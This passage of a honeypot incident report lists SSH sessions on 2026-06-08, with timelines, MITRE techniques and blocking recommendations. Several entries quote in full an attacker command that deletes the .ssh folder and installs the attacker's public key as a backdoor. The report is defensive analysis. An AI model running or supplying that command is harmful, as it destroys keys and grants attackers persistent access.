- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11aa1c3b2d22

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:04 |
| **Last Seen** | 2026-06-08 12:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:04:26` | `cowrie.session.connect` |
| `2026-06-08 12:04:26` | `cowrie.client.version` |
| `2026-06-08 12:04:26` | `cowrie.client.kex` |
| `2026-06-08 12:04:26` | `cowrie.login.success` |
| `2026-06-08 12:04:26` | `cowrie.session.params` |
| `2026-06-08 12:04:26` | `cowrie.command.input` |
| `2026-06-08 12:04:26` | `cowrie.command.failed` |
| `2026-06-08 12:04:27` | `cowrie.log.closed` |
| `2026-06-08 12:04:27` | `cowrie.session.params` |
| `2026-06-08 12:04:27` | `cowrie.command.input` |
| `2026-06-08 12:04:27` | `cowrie.session.file_download` |
| `2026-06-08 12:04:27` | `cowrie.log.closed` |
| `2026-06-08 12:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac622afdbc62

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:04 |
| **Last Seen** | 2026-06-08 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:04:28` | `cowrie.session.connect` |
| `2026-06-08 12:04:28` | `cowrie.client.version` |
| `2026-06-08 12:04:28` | `cowrie.client.kex` |
| `2026-06-08 12:04:28` | `cowrie.login.success` |
| `2026-06-08 12:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb8ed2f76ad

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:15 |
| **Last Seen** | 2026-06-08 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:15:03` | `cowrie.session.connect` |
| `2026-06-08 12:15:03` | `cowrie.client.version` |
| `2026-06-08 12:15:03` | `cowrie.client.kex` |
| `2026-06-08 12:15:03` | `cowrie.login.success` |
| `2026-06-08 12:15:03` | `cowrie.session.params` |
| `2026-06-08 12:15:03` | `cowrie.command.input` |
| `2026-06-08 12:15:03` | `cowrie.command.failed` |
| `2026-06-08 12:15:03` | `cowrie.log.closed` |
| `2026-06-08 12:15:03` | `cowrie.session.params` |
| `2026-06-08 12:15:03` | `cowrie.command.input` |
| `2026-06-08 12:15:03` | `cowrie.session.file_download` |
| `2026-06-08 12:15:03` | `cowrie.log.closed` |
| `2026-06-08 12:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2924a71a13ce

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:15 |
| **Last Seen** | 2026-06-08 12:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:15:05` | `cowrie.session.connect` |
| `2026-06-08 12:15:05` | `cowrie.client.version` |
| `2026-06-08 12:15:05` | `cowrie.client.kex` |
| `2026-06-08 12:15:05` | `cowrie.login.success` |
| `2026-06-08 12:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-940ea0922b1c

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:19 |
| **Last Seen** | 2026-06-08 12:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:19:11` | `cowrie.session.connect` |
| `2026-06-08 12:19:11` | `cowrie.client.version` |
| `2026-06-08 12:19:11` | `cowrie.client.kex` |
| `2026-06-08 12:19:12` | `cowrie.login.success` |
| `2026-06-08 12:19:12` | `cowrie.session.params` |
| `2026-06-08 12:19:12` | `cowrie.command.input` |
| `2026-06-08 12:19:12` | `cowrie.command.failed` |
| `2026-06-08 12:19:12` | `cowrie.log.closed` |
| `2026-06-08 12:19:12` | `cowrie.session.params` |
| `2026-06-08 12:19:12` | `cowrie.command.input` |
| `2026-06-08 12:19:12` | `cowrie.session.file_download` |
| `2026-06-08 12:19:12` | `cowrie.log.closed` |
| `2026-06-08 12:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ab6b8edf4b

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:19 |
| **Last Seen** | 2026-06-08 12:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:19:13` | `cowrie.session.connect` |
| `2026-06-08 12:19:13` | `cowrie.client.version` |
| `2026-06-08 12:19:13` | `cowrie.client.kex` |
| `2026-06-08 12:19:14` | `cowrie.login.success` |
| `2026-06-08 12:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd3b01d9c08

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:21 |
| **Last Seen** | 2026-06-08 12:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:21:12` | `cowrie.session.connect` |
| `2026-06-08 12:21:12` | `cowrie.client.version` |
| `2026-06-08 12:21:12` | `cowrie.client.kex` |
| `2026-06-08 12:21:12` | `cowrie.login.success` |
| `2026-06-08 12:21:13` | `cowrie.session.params` |
| `2026-06-08 12:21:13` | `cowrie.command.input` |
| `2026-06-08 12:21:13` | `cowrie.command.failed` |
| `2026-06-08 12:21:13` | `cowrie.log.closed` |
| `2026-06-08 12:21:13` | `cowrie.session.params` |
| `2026-06-08 12:21:13` | `cowrie.command.input` |
| `2026-06-08 12:21:13` | `cowrie.session.file_download` |
| `2026-06-08 12:21:13` | `cowrie.log.closed` |
| `2026-06-08 12:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545c5f3b9cb6

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:21 |
| **Last Seen** | 2026-06-08 12:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:21:14` | `cowrie.session.connect` |
| `2026-06-08 12:21:14` | `cowrie.client.version` |
| `2026-06-08 12:21:14` | `cowrie.client.kex` |
| `2026-06-08 12:21:15` | `cowrie.login.success` |
| `2026-06-08 12:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6d421d448d

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:25 |
| **Last Seen** | 2026-06-08 12:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:25:20` | `cowrie.session.connect` |
| `2026-06-08 12:25:20` | `cowrie.client.version` |
| `2026-06-08 12:25:20` | `cowrie.client.kex` |
| `2026-06-08 12:25:20` | `cowrie.login.success` |
| `2026-06-08 12:25:20` | `cowrie.session.params` |
| `2026-06-08 12:25:20` | `cowrie.command.input` |
| `2026-06-08 12:25:20` | `cowrie.command.failed` |
| `2026-06-08 12:25:21` | `cowrie.log.closed` |
| `2026-06-08 12:25:21` | `cowrie.session.params` |
| `2026-06-08 12:25:21` | `cowrie.command.input` |
| `2026-06-08 12:25:21` | `cowrie.session.file_download` |
| `2026-06-08 12:25:21` | `cowrie.log.closed` |
| `2026-06-08 12:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa50d2223975

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:25 |
| **Last Seen** | 2026-06-08 12:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:25:22` | `cowrie.session.connect` |
| `2026-06-08 12:25:22` | `cowrie.client.version` |
| `2026-06-08 12:25:22` | `cowrie.client.kex` |
| `2026-06-08 12:25:22` | `cowrie.login.success` |
| `2026-06-08 12:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9becff2977cb

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:27 |
| **Last Seen** | 2026-06-08 12:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:27:47` | `cowrie.session.connect` |
| `2026-06-08 12:27:47` | `cowrie.client.version` |
| `2026-06-08 12:27:47` | `cowrie.client.kex` |
| `2026-06-08 12:27:47` | `cowrie.login.success` |
| `2026-06-08 12:27:47` | `cowrie.session.params` |
| `2026-06-08 12:27:47` | `cowrie.command.input` |
| `2026-06-08 12:27:47` | `cowrie.command.failed` |
| `2026-06-08 12:27:48` | `cowrie.log.closed` |
| `2026-06-08 12:27:48` | `cowrie.session.params` |
| `2026-06-08 12:27:48` | `cowrie.command.input` |
| `2026-06-08 12:27:48` | `cowrie.session.file_download` |
| `2026-06-08 12:27:48` | `cowrie.log.closed` |
| `2026-06-08 12:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01edc9a9a5b2

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:27 |
| **Last Seen** | 2026-06-08 12:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:27:49` | `cowrie.session.connect` |
| `2026-06-08 12:27:49` | `cowrie.client.version` |
| `2026-06-08 12:27:49` | `cowrie.client.kex` |
| `2026-06-08 12:27:49` | `cowrie.login.success` |
| `2026-06-08 12:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd6cc2c4866

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:30 |
| **Last Seen** | 2026-06-08 12:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:30:09` | `cowrie.session.connect` |
| `2026-06-08 12:30:09` | `cowrie.client.version` |
| `2026-06-08 12:30:09` | `cowrie.client.kex` |
| `2026-06-08 12:30:09` | `cowrie.login.success` |
| `2026-06-08 12:30:09` | `cowrie.session.params` |
| `2026-06-08 12:30:09` | `cowrie.command.input` |
| `2026-06-08 12:30:09` | `cowrie.command.failed` |
| `2026-06-08 12:30:09` | `cowrie.log.closed` |
| `2026-06-08 12:30:09` | `cowrie.session.params` |
| `2026-06-08 12:30:09` | `cowrie.command.input` |
| `2026-06-08 12:30:09` | `cowrie.session.file_download` |
| `2026-06-08 12:30:09` | `cowrie.log.closed` |
| `2026-06-08 12:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f79b27fb7a

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 12:30 |
| **Last Seen** | 2026-06-08 12:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:30:11` | `cowrie.session.connect` |
| `2026-06-08 12:30:11` | `cowrie.client.version` |
| `2026-06-08 12:30:11` | `cowrie.client.kex` |
| `2026-06-08 12:30:11` | `cowrie.login.success` |
| `2026-06-08 12:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda98a3c1af4

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-08 12:35 |
| **Last Seen** | 2026-06-08 12:40 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:35:00` | `cowrie.session.connect` |
| `2026-06-08 12:35:02` | `cowrie.client.version` |
| `2026-06-08 12:35:03` | `cowrie.client.kex` |
| `2026-06-08 12:35:03` | `cowrie.login.success` |
| `2026-06-08 12:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-224571955802

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-08 12:39 |
| **Last Seen** | 2026-06-08 12:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:39:21` | `cowrie.session.connect` |
| `2026-06-08 12:39:22` | `cowrie.client.version` |
| `2026-06-08 12:39:22` | `cowrie.client.kex` |
| `2026-06-08 12:39:22` | `cowrie.login.success` |
| `2026-06-08 12:39:23` | `cowrie.session.params` |
| `2026-06-08 12:39:23` | `cowrie.command.input` |
| `2026-06-08 12:39:23` | `cowrie.command.failed` |
| `2026-06-08 12:39:23` | `cowrie.log.closed` |
| `2026-06-08 12:39:24` | `cowrie.session.params` |
| `2026-06-08 12:39:24` | `cowrie.command.input` |
| `2026-06-08 12:39:24` | `cowrie.session.file_download` |
| `2026-06-08 12:39:24` | `cowrie.log.closed` |
| `2026-06-08 12:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d2e6114c70

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-08 12:39 |
| **Last Seen** | 2026-06-08 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:39:28` | `cowrie.session.connect` |
| `2026-06-08 12:39:28` | `cowrie.client.version` |
| `2026-06-08 12:39:28` | `cowrie.client.kex` |
| `2026-06-08 12:39:29` | `cowrie.login.success` |
| `2026-06-08 12:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a829b261ed3b

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-08 12:40 |
| **Last Seen** | 2026-06-08 12:41 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 12:40:42` | `cowrie.session.connect` |
| `2026-06-08 12:40:42` | `cowrie.client.version` |
| `2026-06-08 12:40:42` | `cowrie.client.kex` |
| `2026-06-08 12:40:43` | `cowrie.login.success` |
